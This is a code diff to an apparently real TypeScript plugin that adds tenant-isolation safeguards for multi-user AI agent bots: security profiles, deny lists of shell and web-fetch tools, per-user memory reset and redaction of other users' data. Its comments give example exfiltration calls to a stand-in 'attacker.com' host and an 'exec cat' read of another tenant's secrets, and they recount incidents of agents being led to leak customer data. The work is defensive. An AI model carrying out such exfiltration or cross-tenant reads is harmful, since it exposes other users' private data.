@@ -40,6 +40,9 @@
 
 import { definePluginEntry } from "openclaw/plugin-sdk/plugin-entry";
 
+import { sandboxToolParams } from "./sender-sandbox.js";
+import { redactForeignUserSecrets } from "./input-redactor.js";
+
 // ----- public config shape ------------------------------------------------
 
 interface LuminDiagnosticsConfig {
@@ -131,6 +134,179 @@ interface LuminDiagnosticsConfig {
    * better than ``userBlockedMessage``'s "perform that action"
    * phrasing when the user just typed adversarial text. */
   userInputBlockedMessage?: string;
+
+  // ----- Tenant isolation (v0.7.0 — TENANT_ISOLATION_SPEC §2.1) ------
+  /** Operator-declared paths that bypass the per-sender storage
+   * sandbox and resolve against the shared workspace root. Glob
+   * patterns relative to the workspace, or absolute paths.
+   * Example: ``["AGENTS.md", "IDENTITY.md", "templates/**"]``.
+   *
+   * Read-only by default — write tools (``write``, ``edit``)
+   * targeting a shared path are blocked with
+   * ``write_to_shared_path`` reason. Future: ``shared_writable``
+   * flag for opt-in writable scratchpads. */
+  sharedPaths?: string[];
+
+  /** When true, an fs tool call that arrives without a
+   * ``workspaceDir`` in hook context is BLOCKED rather than
+   * silently passed through. Production deployments should set
+   * this to true (TENANT_ISOLATION_SPEC §2.1 fail-closed). The
+   * default (false) preserves backward-compatible fail-warn
+   * behaviour for existing operators. */
+  failClosedOnMissingWorkspace?: boolean;
+
+  /** Override / fallback for the agent's workspace directory
+   * used by the per-sender storage sandbox. OpenClaw 2026.5.x
+   * has been observed NOT to propagate ``workspaceDir`` on the
+   * ``before_tool_call`` hook context, which silently disables
+   * the sandbox. Set this to your agent's workspace path
+   * (typically ``~/.openclaw/workspace``) so the sandbox still
+   * binds tool calls to per-sender directories. */
+  workspaceDir?: string;
+
+  /** One-knob shorthand for tenant-isolation defaults. Pick the
+   * profile that matches your bot's deployment risk level. Each
+   * profile sets sensible defaults for every protection below.
+   * Set individual toggles only if you need to deviate.
+   *
+   * | profile | who it's for |
+   * |---|---|
+   * | ``strict``       | Healthcare, finance, legal, multi-tenant SaaS — every protection on, fails closed |
+   * | ``standard``     | Default — multi-user bots (Slack/Telegram support, sales triage) |
+   * | ``light``        | Single-team internal bots, dev environments |
+   * | ``logging-only`` | Trace + log only, never block (Lumin as a Langfuse-style observer) |
+   *
+   * 90% of operators set this once. Per-toggle fields below
+   * override the profile's defaults when explicitly set. */
+  securityProfile?:
+    | "strict" | "standard" | "light" | "logging-only"
+    // Legacy aliases preserved for backward compat:
+    | "balanced" | "permissive" | "observability";
+
+  // ===== USER-FRIENDLY TOGGLES (Slice 5 — operator UX) ===================
+  //
+  // Plain-English toggles that operators can flip without learning the
+  // L1/L2/L3 spec terminology. Each maps onto the technical field below.
+  // Setting an explicit value here OVERRIDES the active securityProfile
+  // for that toggle. Setting both the friendly toggle AND its technical
+  // counterpart: friendly wins (more visible to humans reading config).
+
+  /** Master switch for the entire tenant-isolation firewall. When
+   * false, the plugin still records traces and spans but never
+   * blocks or rewrites. Equivalent to ``securityProfile:
+   * "logging-only"``. */
+  enableTenantIsolation?: boolean;
+
+  /** Block tools that can run shell commands (exec, bash, python,
+   * etc.). When true, an LLM that tries to ``exec("cat /other-
+   * tenant/secret")`` is refused. Default: on. */
+  blockShellTools?: boolean;
+
+  /** Block tools that can fetch from the web (web_fetch, http_get,
+   * curl, etc.). When true, an LLM that tries to
+   * ``web_fetch("https://attacker.com?leak=...")`` is refused.
+   * Default: on. */
+  blockWebTools?: boolean;
+
+  /** When does the bot's memory of prior turns get cleared?
+   *
+   *   - ``"between-users"`` (default): each user gets a fresh
+   *     conversation. Switching from User A's turn to User B's
+   *     turn wipes the LLM's history.
+   *   - ``"between-channels"``: same user keeps history across
+   *     turns within one channel; switching channels wipes.
+   *     Better UX when one user uses both Telegram and Slack.
+   *   - ``"never"``: don't clear. Only safe when your bot
+   *     architecturally guarantees per-user contexts.
+   */
+  resetMemoryBetweenUsers?: "between-users" | "between-channels" | "never";
+
+  /** When true, the AI's prompt is scrubbed of other users' data
+   * (names, emails, account IDs, organisations) before every
+   * model call. Defense-in-depth on top of memory reset.
+   * Default: on for ``standard`` and ``strict`` profiles. */
+  hideOtherUsersData?: boolean;
+
+  /** When true (default), every block/redaction generates an
+   * audit row visible in the Lumin dashboard's Violations table.
+   * Set to a number 0..1 to sample (e.g. 0.1 = record 10% of
+   * blocks — useful for high-volume deployments). Default: 1.0. */
+  recordSecurityEvents?: boolean | number;
+
+  /** Controls L2 conversation-history isolation behaviour
+   * (TENANT_ISOLATION_SPEC §2.3). Three modes:
+   *
+   *   - ``"clear-on-switch"`` (default): when the senderId for the
+   *     current turn differs from the previous turn on the same
+   *     agent, drop ``event.messages`` to ``[]`` so the LLM sees
+   *     only this turn — full structural isolation.
+   *   - ``"scope-by-channel"``: track last sender per
+   *     (agentId, channel) tuple instead of just agentId. Same
+   *     user across Telegram + Slack keeps history; switch within
+   *     the same channel still wipes. Useful when a single user
+   *     legitimately uses multiple transports.
+   *   - ``"off"``: do not clear history. ONLY appropriate when the
+   *     bot's runtime guarantees per-sender agent contexts
+   *     architecturally (spec §2.3 path (a)) — otherwise this
+   *     re-opens the cross-session leak vector. Audited with a
+   *     warning at startup. */
+  l2HistoryResetMode?: "clear-on-switch" | "scope-by-channel" | "off";
+
+  /** L3 input-redactor detector toggles. Each detector can be
+   * disabled independently. Defaults follow the active
+   * ``securityProfile``. Setting any field overrides the profile.
+   *
+   *   - ``vault_exact`` — match foreign-tenant excerpts already
+   *     ingested into the vault. Cheap, exact-match.
+   *   - ``structural_pattern`` — regex-based ID / email / generic
+   *     pattern detection. Cheap, false-positive-prone but high
+   *     recall.
+   *   - ``presidio`` — Microsoft Presidio NER for person /
+   *     location / organization. Heavier (~50ms latency, ~750MB
+   *     image) — disable in size- or latency-constrained
+   *     deployments.
+   */
+  l3Detectors?: {
+    vault_exact?: boolean;
+    structural_pattern?: boolean;
+    presidio?: boolean;
+  };
+
+  /** Fraction of plugin-side blocks that produce an L4 violation
+   * row in /v1/violations. 1.0 = every block recorded; 0.1 =
+   * 10% sampled; 0.0 = no rows. High-traffic deployments may
+   * want sampling to keep audit-table volume manageable. Defaults
+   * to the active securityProfile. */
+  auditSamplingRate?: number;
+
+  /** Tools to refuse outright before any sandboxing logic runs.
+   * Two classes of bypass tools default to deny:
+   *
+   *   - Shell / code-exec — ``exec("cat /other/tenant/secret")``
+   *     reads foreign data without ever touching fs tools.
+   *   - Network egress — ``web_fetch("https://attacker.com?leak=...")``
+   *     exfiltrates data via URL params or POST body without
+   *     touching fs tools.
+   *
+   * Per spec §2.2 + §7, the only safe baseline is deny-by-default;
+   * operators who need either class opt specific tool names in by
+   * setting ``deniedTools: []`` (NOT recommended) or by overriding
+   * with a curated subset.
+   *
+   * Default (v0.7.0): shell-class — ``exec, shell, bash, run, sh,
+   * zsh, python, node, ruby``; egress-class — ``web_fetch, http_get,
+   * http_post, http_put, http_delete, fetch, curl``.
+   *
+   * 2026-05-10 incidents (both real, both blocked by this default):
+   *  - Slack sender used ``exec`` to ``cat`` a Telegram sender's
+   *    per-sender memory file, exfiltrating customer data despite
+   *    an otherwise-working L1 storage sandbox.
+   *  - Same agent's system prompt advertised ``web_fetch`` as
+   *    available; an attacker could trivially have used
+   *    ``web_fetch("https://attacker.com?leak=" + secret)`` to
+   *    exfiltrate via URL — no fs tool, no exec, no audit-table
+   *    fingerprint beyond the egress hit. */
+  deniedTools?: string[];
 }
 
 const DEFAULT_USER_BLOCKED_MESSAGE =
@@ -142,6 +318,261 @@ const DEFAULT_USER_INPUT_BLOCKED_MESSAGE =
   "Please rephrase or contact an administrator if you believe this is in error.";
 
 const DEFAULT_HOST = "http://localhost:8000";
+
+
+// ----- securityProfile defaults (Slice 2) --------------------------------
+//
+// Each profile is a curated bundle of layer-defaults. Per-layer config
+// fields override the profile's defaults when explicitly set, so an
+// operator can pick "strict" and tweak just one knob if needed. The
+// defaults are deliberately conservative on the strict end and lenient
+// on the observability end — the four points span the full range so
+// any deployment maps cleanly onto one of them.
+//
+// IMPORTANT: changing a profile's defaults is a behaviour-change for
+// existing operators who selected that profile by name. Bump the major
+// version of @lumin-io/openclaw-diagnostics if you alter the strict /
+// balanced contracts; operators rely on these as audit baselines.
+
+interface ResolvedProfile {
+  failClosedOnMissingWorkspace: boolean;
+  deniedTools: string[];
+  l2HistoryResetMode: "clear-on-switch" | "scope-by-channel" | "off";
+  l3Detectors: {
+    vault_exact: boolean;
+    structural_pattern: boolean;
+    presidio: boolean;
+  };
+  auditSamplingRate: number;
+  enforce: boolean;
+}
+
+const DENY_LIST_SHELL = [
+  "exec", "shell", "bash", "run", "sh", "zsh",
+  "python", "node", "ruby",
+];
+const DENY_LIST_EGRESS = [
+  "web_fetch", "http_get", "http_post", "http_put",
+  "http_delete", "fetch", "curl",
+];
+const DENY_LIST_FULL = [...DENY_LIST_SHELL, ...DENY_LIST_EGRESS];
+
+export const SECURITY_PROFILES: Record<string, ResolvedProfile> = {
+  strict: {
+    failClosedOnMissingWorkspace: true,
+    deniedTools: DENY_LIST_FULL,
+    l2HistoryResetMode: "clear-on-switch",
+    l3Detectors: {
+      vault_exact: true, structural_pattern: true, presidio: true,
+    },
+    auditSamplingRate: 1.0,
+    enforce: true,
+  },
+  // "standard" is the new operator-friendly name for what was
+  // "balanced" — kept under both names for backward compat.
+  standard: {
+    failClosedOnMissingWorkspace: false,
+    deniedTools: DENY_LIST_FULL,
+    l2HistoryResetMode: "clear-on-switch",
+    l3Detectors: {
+      vault_exact: true, structural_pattern: true, presidio: false,
+    },
+    auditSamplingRate: 1.0,
+    enforce: true,
+  },
+  light: {
+    failClosedOnMissingWorkspace: false,
+    deniedTools: [],
+    l2HistoryResetMode: "scope-by-channel",
+    l3Detectors: {
+      vault_exact: true, structural_pattern: false, presidio: false,
+    },
+    auditSamplingRate: 0.1,
+    enforce: true,
+  },
+  "logging-only": {
+    failClosedOnMissingWorkspace: false,
+    deniedTools: [],
+    l2HistoryResetMode: "off",
+    l3Detectors: {
+      vault_exact: false, structural_pattern: false, presidio: false,
+    },
+    auditSamplingRate: 1.0,
+    enforce: false,  // Lumin observes (spans + traces) but never blocks
+  },
+};
+// Legacy aliases — same defaults, easier upgrade path for existing configs.
+SECURITY_PROFILES.balanced = SECURITY_PROFILES.standard;
+SECURITY_PROFILES.permissive = SECURITY_PROFILES.light;
+SECURITY_PROFILES.observability = SECURITY_PROFILES["logging-only"];
+
+// ----- Live settings polling (Slice 5) -----------------------------------
+//
+// Plugin polls /v1/admin/firewall/profile at register-time and merges
+// the dashboard-managed values OVER the openclaw.json config. So the
+// precedence (highest → lowest) is:
+//   1. Dashboard settings (Lumin DB)        ← can change at runtime
+//   2. openclaw.json plugin config          ← edit-and-restart
+//   3. securityProfile defaults             ← built-in
+//
+// The fetch is best-effort; if Lumin is unreachable, we fall back to
+// the openclaw.json config alone (Rule 7 — Lumin outage must never
+// break the agent). Result is cached on globalThis for 30s so we
+// don't add HTTP overhead on every register / hot-reload.
+
+interface DashboardProfile {
+  agent_id: string;
+  security_profile: string | null;
+  overrides: Partial<LuminDiagnosticsConfig>;
+}
+
+const DASHBOARD_POLL_TTL_MS = 30_000;
+
+async function fetchDashboardProfile(
+  host: string,
+  agentId: string,
+  log: { info?: (s: string) => void; warn?: (s: string) => void } | undefined,
+): Promise<DashboardProfile | undefined> {
+  const cache = globalThis as unknown as {
+    __lumin_dashboardProfileCache?: Map<string, { value: DashboardProfile; fetchedAtMs: number }>;
+  };
+  if (!cache.__lumin_dashboardProfileCache) {
+    cache.__lumin_dashboardProfileCache = new Map();
+  }
+  const cached = cache.__lumin_dashboardProfileCache.get(agentId);
+  if (cached && Date.now() - cached.fetchedAtMs < DASHBOARD_POLL_TTL_MS) {
+    return cached.value;
+  }
+  try {
+    const url =
+      `${host.replace(/\/+$/, "")}/v1/admin/firewall/profile?agent_id=${encodeURIComponent(agentId)}`;
+    const ctrl = new AbortController();
+    const timer = setTimeout(() => ctrl.abort(), 3000);
+    try {
+      const resp = await fetch(url, {
+        method: "GET",
+        signal: ctrl.signal,
+      });
+      if (!resp.ok) {
+        // Endpoint missing (older Lumin) or auth error — silently
+        // fall through. Don't blast the log every poll cycle.
+        return undefined;
+      }
+      const body = (await resp.json()) as DashboardProfile;
+      cache.__lumin_dashboardProfileCache.set(agentId, {
+        value: body,
+        fetchedAtMs: Date.now(),
+      });
+      log?.info?.(
+        `lumin-diagnostics: dashboard profile loaded for ` +
+        `agent=${agentId} profile=${body.security_profile ?? "(none)"} ` +
+        `overrides=${Object.keys(body.overrides || {}).length}`,
+      );
+      return body;
+    } finally {
+      clearTimeout(timer);
+    }
+  } catch {
+    // Lumin unreachable. Plugin works fine on openclaw.json alone.
+    return undefined;
+  }
+}
+
+
+/**
+ * Merge a profile's defaults with explicit per-layer overrides from
+ * the plugin config. Returns the effective settings the rest of the
+ * plugin should use. Per-layer fields ALWAYS win when explicitly set;
+ * the profile only fills the gaps.
+ *
+ * Default profile is "standard" — preserves existing behaviour for
+ * operators who upgrade without setting securityProfile.
+ */
+export function resolveSecuritySettings(cfg: LuminDiagnosticsConfig): ResolvedProfile {
+  // 1) Pick base profile. ``standard`` is the default when nothing
+  //    is set — backward-compatible with existing operators (it has
+  //    the same defaults the plugin shipped with before profiles).
+  const profileName = cfg.securityProfile ?? "standard";
+  const base = SECURITY_PROFILES[profileName] ?? SECURITY_PROFILES.standard;
+
+  // 2) Resolve user-friendly toggles into their technical equivalents.
+  //    Friendly toggles override the profile; technical fields then
+  //    override friendly ones (operator wrote it explicitly = wins).
+
+  // enableTenantIsolation → enforce
+  let enforce = base.enforce;
+  if (cfg.enableTenantIsolation !== undefined) enforce = cfg.enableTenantIsolation;
+  if (cfg.enforce !== undefined) enforce = cfg.enforce;
+
+  // blockShellTools / blockWebTools → deniedTools.
+  // Each toggle affects ONLY its own slice — setting blockShellTools
+  // leaves egress denies untouched, and vice versa. Start from the
+  // profile's base list as a Set, then add/remove per toggle.
+  const deniedSet = new Set<string>(base.deniedTools);
+  if (cfg.blockShellTools === true) DENY_LIST_SHELL.forEach((t) => deniedSet.add(t));
+  if (cfg.blockShellTools === false) DENY_LIST_SHELL.forEach((t) => deniedSet.delete(t));
+  if (cfg.blockWebTools === true) DENY_LIST_EGRESS.forEach((t) => deniedSet.add(t));
+  if (cfg.blockWebTools === false) DENY_LIST_EGRESS.forEach((t) => deniedSet.delete(t));
+  let deniedTools = Array.from(deniedSet);
+  if (cfg.deniedTools !== undefined) deniedTools = cfg.deniedTools;
+
+  // resetMemoryBetweenUsers → l2HistoryResetMode (translate vocab)
+  let l2HistoryResetMode = base.l2HistoryResetMode;
+  if (cfg.resetMemoryBetweenUsers !== undefined) {
+    const map: Record<string, "clear-on-switch" | "scope-by-channel" | "off"> = {
+      "between-users": "clear-on-switch",
+      "between-channels": "scope-by-channel",
+      "never": "off",
+    };
+    l2HistoryResetMode = map[cfg.resetMemoryBetweenUsers] ?? base.l2HistoryResetMode;
+  }
+  if (cfg.l2HistoryResetMode !== undefined) l2HistoryResetMode = cfg.l2HistoryResetMode;
+
+  // hideOtherUsersData → l3Detectors (master switch — flip all
+  // detectors on or off in one go; per-detector overrides win)
+  let l3Detectors = { ...base.l3Detectors };
+  if (cfg.hideOtherUsersData !== undefined) {
+    if (cfg.hideOtherUsersData) {
+      l3Detectors = { vault_exact: true, structural_pattern: true, presidio: true };
+    } else {
+      l3Detectors = { vault_exact: false, structural_pattern: false, presidio: false };
+    }
+  }
+  if (cfg.l3Detectors) {
+    l3Detectors = {
+      vault_exact: cfg.l3Detectors.vault_exact ?? l3Detectors.vault_exact,
+      structural_pattern: cfg.l3Detectors.structural_pattern ?? l3Detectors.structural_pattern,
+      presidio: cfg.l3Detectors.presidio ?? l3Detectors.presidio,
+    };
+  }
+
+  // recordSecurityEvents → auditSamplingRate
+  let auditSamplingRate = base.auditSamplingRate;
+  if (cfg.recordSecurityEvents !== undefined) {
+    if (typeof cfg.recordSecurityEvents === "boolean") {
+      auditSamplingRate = cfg.recordSecurityEvents ? 1.0 : 0.0;
+    } else {
+      auditSamplingRate = Math.max(0, Math.min(1, cfg.recordSecurityEvents));
+    }
+  }
+  if (cfg.auditSamplingRate !== undefined) {
+    auditSamplingRate = Math.max(0, Math.min(1, cfg.auditSamplingRate));
+  }
+
+  // failClosedOnMissingWorkspace — no friendly alias yet (rarely
+  // tweaked by hand; profile default is the right knob).
+  const failClosedOnMissingWorkspace =
+    cfg.failClosedOnMissingWorkspace ?? base.failClosedOnMissingWorkspace;
+
+  return {
+    failClosedOnMissingWorkspace,
+    deniedTools,
+    l2HistoryResetMode,
+    l3Detectors,
+    auditSamplingRate,
+    enforce,
+  };
+}
 const DEFAULT_PROJECT = "openclaw";
 const DEFAULT_MAX_CONTENT_CHARS = 32_768;
 const DEFAULT_TIMEOUT_MS = 5_000;
@@ -387,6 +818,48 @@ class LuminClient {
         );
         this.failureLogged = true;
       }
+    } finally {
+      clearTimeout(timer);
+    }
+  }
+
+  /**
+   * Fire-and-forget POST a policy violation row. Used when the
+   * plugin BLOCKS a call locally (L1 fail-closed, L1.5 deny-by-
+   * default, L1 write-to-shared-path) — these don't go through
+   * the server-side ``/v1/policy/decide`` endpoint, so without
+   * this they wouldn't appear in the SOC's audit dashboard.
+   *
+   * Schema: ``PolicyViolationInput`` — requires policy_name,
+   * severity, trace_id. condition_text and action_taken carry
+   * the human-readable detail for dashboard rendering.
+   */
+  async sendViolation(v: {
+    policy_name: string;
+    severity: string;
+    trace_id: string;
+    span_id?: string;
+    condition_text?: string;
+    action_taken?: string;
+    actual_value?: string;
+  }): Promise<void> {
+    const body = JSON.stringify({ violations: [v] });
+    const ctrl = new AbortController();
+    const timer = setTimeout(() => ctrl.abort(), this.timeoutMs);
+    try {
+      await fetch(`${this.host}/v1/violations`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "X-Lumin-Project": this.project,
+        },
+        body,
+        signal: ctrl.signal,
+      });
+    } catch {
+      // best-effort; the per-call console log already records the
+      // block locally. A missing audit row is recoverable; blocking
+      // the agent on an audit hiccup is not. Spec §4.3 Rule 7.
     } finally {
       clearTimeout(timer);
     }
@@ -735,6 +1208,7 @@ function buildSpanFromPair(
   output: LlmOutputEvent,
   cfg: LuminDiagnosticsConfig,
   hookCtx: HookContext | undefined,
+  userId?: string,
 ): Record<string, unknown> {
   const maxLen = cfg.maxContentChars ?? DEFAULT_MAX_CONTENT_CHARS;
   const trace = hookCtx?.trace || pending.trace;
@@ -776,6 +1250,13 @@ function buildSpanFromPair(
     input: pending.input,
     output: outputText ? stringify(outputText, maxLen) : undefined,
     session_id: output.sessionId || hookCtx?.sessionId,
+    // Slice 6A.3 (v0.6.1) — propagate user_id into the trace row via
+    // the span body. Without this the cross-session vault detector
+    // sees user_id='' on every Slack/Telegram trace and treats it
+    // as anonymous, never flagging cross-user leaks. Caller passes
+    // the per-session-resolved user_id (richer than ctx alone since
+    // ctx often loses senderId on later turns).
+    user_id: userId ?? resolveUserIdFromCtx(hookCtx),
     metadata: {
       "openclaw.runId": runId,
       "openclaw.harnessId": output.harnessId,
@@ -813,6 +1294,7 @@ function buildSpanFromToolCall(
   after: AfterToolCallEvent,
   cfg: LuminDiagnosticsConfig,
   hookCtx: HookContext | undefined,
+  userId?: string,
 ): Record<string, unknown> {
   const maxLen = cfg.maxContentChars ?? DEFAULT_MAX_CONTENT_CHARS;
   const trace = hookCtx?.trace || before.trace;
@@ -851,6 +1333,7 @@ function buildSpanFromToolCall(
     input: stringify(before.params ?? after.params ?? {}, maxLen),
     output: after.result !== undefined ? stringify(after.result, maxLen) : undefined,
     session_id: hookCtx?.sessionId,
+    user_id: userId ?? resolveUserIdFromCtx(hookCtx),
     duration_ms: after.durationMs,
     metadata: {
       "openclaw.runId": runId,
@@ -858,6 +1341,23 @@ function buildSpanFromToolCall(
       "openclaw.toolName": after.toolName,
     },
   };
+}
+
+
+/**
+ * Module-level resolver used by the span builders (which run BEFORE
+ * the per-plugin closure and therefore can't reference the
+ * sessionToSender map). Returns whatever ``user_id`` signal we can
+ * pull from the hook context. The richer per-session lookup
+ * (sessionToSender) lives inside the closure below; this module-
+ * level function is the conservative fallback.
+ */
+function resolveUserIdFromCtx(
+  hookCtx: HookContext | undefined,
+): string | undefined {
+  if (!hookCtx) return undefined;
+  const ctxAny = hookCtx as unknown as { senderId?: string; userId?: string };
+  return ctxAny.senderId || ctxAny.userId || undefined;
 }
 
 
@@ -1001,12 +1501,101 @@ export default definePluginEntry({
     const cfg: LuminDiagnosticsConfig = apiAny.pluginConfig || {};
     const client = new LuminClient(cfg);
     const fw = new LuminFirewallClient(cfg);
-    // Default-on. Operators who want pure observation can set
-    // ``enforce: false`` in their openclaw.json config; useful during
-    // initial rollout when the policies table is empty so the
-    // round-trip overhead disappears entirely (decide returns allow
-    // in <1ms anyway, but the network hop still costs something).
-    const enforceEnabled = cfg.enforce !== false;
+    // Resolve securityProfile + per-layer overrides once at register
+    // time. Per-layer fields override profile defaults; the resolved
+    // ``settings`` object is what every hook reads going forward.
+    //
+    // Dashboard merge (Slice 5):
+    //   1) ``initialReady`` — first fetch races register; the first
+    //      tool-call / prompt-build hook awaits this with a 1s hard
+    //      timeout so the very first request can't see stale defaults.
+    //   2) ``setInterval(refresh, 30s)`` — periodic re-fetch keeps
+    //      runtime changes propagating without a gateway restart.
+    // Both branches mutate ``settings`` in place; all hooks captured
+    // the reference and see updates immediately.
+    const settings = resolveSecuritySettings(cfg);
+    const enforceEnabled = settings.enforce;
+
+    const dashboardHost = (cfg.host || DEFAULT_HOST).replace(/\/+$/, "");
+    const refreshSettingsFromDashboard = async (
+      reason: "initial" | "periodic" | "per-hook",
+      agentIdHint?: string,
+    ): Promise<void> => {
+      try {
+        const dashboardProfile = await fetchDashboardProfile(
+          dashboardHost, agentIdHint || "_default", apiAny.logger,
+        );
+        if (!dashboardProfile) return;
+        const hasOverrides = dashboardProfile.security_profile
+          || (dashboardProfile.overrides && Object.keys(dashboardProfile.overrides).length > 0);
+        const merged: LuminDiagnosticsConfig = { ...cfg };
+        if (hasOverrides) {
+          if (dashboardProfile.security_profile) {
+            merged.securityProfile = dashboardProfile.security_profile as LuminDiagnosticsConfig["securityProfile"];
+          }
+          Object.assign(merged, dashboardProfile.overrides);
+        }
+        const refreshed = resolveSecuritySettings(merged);
+        // In-place mutate so every hook sees the new values without
+        // re-resolving per-call. Object.assign overwrites every field
+        // present on ``refreshed``, including arrays and nested objects.
+        Object.assign(settings, refreshed);
+        if (hasOverrides) {
+          apiAny.logger?.info?.(
+            `lumin-diagnostics: settings refreshed from dashboard ` +
+            `(reason=${reason} agent=${agentIdHint ?? "_default"} ` +
+            `profile=${dashboardProfile.security_profile ?? cfg.securityProfile ?? "standard"} ` +
+            `overrideKeys=${Object.keys(dashboardProfile.overrides || {}).length})`,
+          );
+        }
+      } catch {
+        // Best-effort. Plugin runs on openclaw.json alone if
+        // dashboard is unreachable. Rule 7.
+      }
+    };
+
+    // Initial fetch — kicked off async so register doesn't block.
+    // ``initialReady`` lets the first hook stall briefly (max 1s) for
+    // the merge result before falling back to openclaw.json defaults.
+    let initialReadyResolve: () => void = () => undefined;
+    const initialReady = new Promise<void>((r) => { initialReadyResolve = r; });
+    void (async () => {
+      await refreshSettingsFromDashboard("initial");
+      initialReadyResolve();
+    })();
+    // Expose the gate for hooks. Capped at 1s so a Lumin outage can't
+    // freeze the agent's first response indefinitely.
+    const awaitInitialDashboardMerge = async (): Promise<void> => {
+      await Promise.race([
+        initialReady,
+        new Promise<void>((r) => setTimeout(r, 1000)),
+      ]);
+    };
+
+    // Per-agent settings: when ctx.agentId is present, prefer the
+    // agent-specific firewall_settings row (falls back to _default
+    // server-side). Tracked here so we re-fetch when the active
+    // agent changes within the gateway lifetime. The fetch itself
+    // is TTL-cached (30s) inside ``fetchDashboardProfile``, so
+    // rapid agent switches don't hammer the API.
+    let lastFetchedAgent: string | undefined = undefined;
+    const ensureAgentSettings = async (agentId: string | undefined): Promise<void> => {
+      const target = agentId || "_default";
+      if (target === lastFetchedAgent) return;
+      lastFetchedAgent = target;
+      await refreshSettingsFromDashboard("per-hook", target);
+    };
+
+    // Periodic refresh — re-fetch every 30s while the gateway is
+    // running. Picks up dashboard changes without a restart. The
+    // interval is unref'd so it doesn't keep the process alive on
+    // shutdown.
+    const refreshIntervalMs = 30_000;
+    const dashboardRefreshTimer = setInterval(() => {
+      void refreshSettingsFromDashboard("periodic");
+    }, refreshIntervalMs);
+    // unref isn't on all timer types in Node; guard.
+    (dashboardRefreshTimer as unknown as { unref?: () => void }).unref?.();
     const pending = new PendingLlmRegistry();
     const toolPending = new PendingToolCallRegistry();
     // v0.5.3 — input-side firewall block markers, consumed by
@@ -1016,14 +1605,63 @@ export default definePluginEntry({
     const replyOnInputBlock = cfg.replyOnInputBlock !== false;
     const log = apiAny.logger;
 
+    // Log resolved profile at startup so operators can verify what
+    // settings actually took effect after profile + override merge.
+    log?.info?.(
+      `lumin-diagnostics: securityProfile=${cfg.securityProfile ?? "standard"} ` +
+      `(enforce=${settings.enforce} ` +
+      `failClosed=${settings.failClosedOnMissingWorkspace} ` +
+      `deniedTools=${settings.deniedTools.length} ` +
+      `resetMemoryBetweenUsers=${settings.l2HistoryResetMode} ` +
+      `hideOtherUsersData={vault:${settings.l3Detectors.vault_exact}, ` +
+      `structural:${settings.l3Detectors.structural_pattern}, ` +
+      `presidio:${settings.l3Detectors.presidio}} ` +
+      `recordSecurityEvents=${settings.auditSamplingRate})`,
+    );
+    if (settings.l2HistoryResetMode === "off") {
+      log?.warn?.(
+        "lumin-diagnostics: resetMemoryBetweenUsers is OFF. This is " +
+        "only safe when your agent runtime guarantees per-sender " +
+        "contexts architecturally — otherwise foreign-tenant text in " +
+        "history leaks across senders. See TENANT_ISOLATION_SPEC §2.3.",
+      );
+    }
+
     // ----- Admin separation tracking (v0.4.0 — Slice 2 Tier 1.0/1.0b) ---
     // Maps sessionKey → senderId (recorded from inbound_claim) and
     // sessionKey → recent block timestamp (set when before_tool_call's
     // Lumin response is block / require_approval). The
     // before_message_write hook reads both maps to decide whether to
     // suppress the LLM's reply.
-    const sessionToSender = new Map<string, string>();
-    const sessionRecentBlock = new Map<string, number>();
+    //
+    // v0.6.1 (2026-05-10) — these used to be local ``new Map()``
+    // instances per-register. The outbound shim patches a global
+    // prototype EXACTLY ONCE (idempotent by sentinel), so its
+    // closure pinned the FIRST register's Map. On plugin hot-
+    // reload, register() created NEW Maps that the shim couldn't
+    // see — sessionToSender lookups returned mapSize=0 even though
+    // before_dispatch had populated the live (later) Map. Live
+    // brutal-test reproduced this; the cross-session leak slipped
+    // through because the shim couldn't resolve the recipient
+    // user_id to send to fw.decide.
+    //
+    // Fix: stash both maps on ``globalThis`` so every register
+    // call (and the shim's closure) reads from the same instance
+    // regardless of reload count. Using ``globalThis`` is
+    // explicitly fine here — the maps are per-process bot state,
+    // and the plugin process IS the lifecycle boundary.
+    const __luminGlobals = globalThis as {
+      __lumin_sessionToSender?: Map<string, string>;
+      __lumin_sessionRecentBlock?: Map<string, number>;
+    };
+    if (!__luminGlobals.__lumin_sessionToSender) {
+      __luminGlobals.__lumin_sessionToSender = new Map();
+    }
+    if (!__luminGlobals.__lumin_sessionRecentBlock) {
+      __luminGlobals.__lumin_sessionRecentBlock = new Map();
+    }
+    const sessionToSender = __luminGlobals.__lumin_sessionToSender;
+    const sessionRecentBlock = __luminGlobals.__lumin_sessionRecentBlock;
     // Window during which a recent block triggers reply suppression.
     // Keep tight so a stale block from N minutes ago doesn't suppress
     // an unrelated subsequent reply. 60s covers the LLM's typical
@@ -1040,6 +1678,7 @@ export default definePluginEntry({
       if (!senderId) return false;
       return adminSenders.has(senderId.toLowerCase().trim());
     }
+
 
     /**
      * Resolve the sender identity to use as Lumin's ``user_id`` on
@@ -1140,11 +1779,17 @@ export default definePluginEntry({
       }
     });
 
-    apiAny.on("llm_output", (rawEvent: unknown, rawCtx: unknown) => {
+    apiAny.on("llm_output", async (rawEvent: unknown, rawCtx: unknown) => {
       try {
         const event = rawEvent as LlmOutputEvent;
         const ctx = rawCtx as HookContext | undefined;
         const entry = pending.take(event.runId);
+        // v0.6.1 — resolve sender identity for the trace row's
+        // user_id. Uses the same per-session lookup as fw.decide()
+        // so a turn N message reuses the senderId we recorded on
+        // turn 1 even if ctx no longer carries it.
+        const userId = resolveUserId(undefined, ctx);
+
         if (!entry) {
           // No matching llm_input. Either the input hook dropped
           // (e.g. raw model run path) or this is a fresh restart
@@ -1155,12 +1800,56 @@ export default definePluginEntry({
             startedAtMs: Date.now(),
             trace: ctx?.trace,
           };
-          const span = buildSpanFromPair(event.runId, fallback, event, cfg, ctx);
+          const span = buildSpanFromPair(event.runId, fallback, event, cfg, ctx, userId);
           void client.send(span).catch(() => {});
-          return;
+        } else {
+          const span = buildSpanFromPair(event.runId, entry, event, cfg, ctx, userId);
+          void client.send(span).catch(() => {});
         }
-        const span = buildSpanFromPair(event.runId, entry, event, cfg, ctx);
-        void client.send(span).catch(() => {});
+
+        // v0.6.1 — call fw.decide(after_proxy_call) with the actual
+        // model reply text. before_agent_reply was misnamed: its
+        // cleanedBody field carries the *user's input*, not the
+        // assistant's reply (live brutal testing 2026-05-09 — the
+        // OpenClaw cross-session leak slipped through because the
+        // detector never saw the assistant's text). assistantTexts
+        // here IS the LLM's response, so this is the place to scan
+        // for after_proxy_call rules like cross_session_leak,
+        // owasp_llm02_pii_disclosure, etc. Fire-and-forget — the
+        // span has already shipped, this only records the decision +
+        // any violation; rewriting in-flight requires a different
+        // hook (message_sending) which doesn't fire on every channel
+        // and is tracked separately.
+        // L4 audit: record an after_proxy_call decision for the
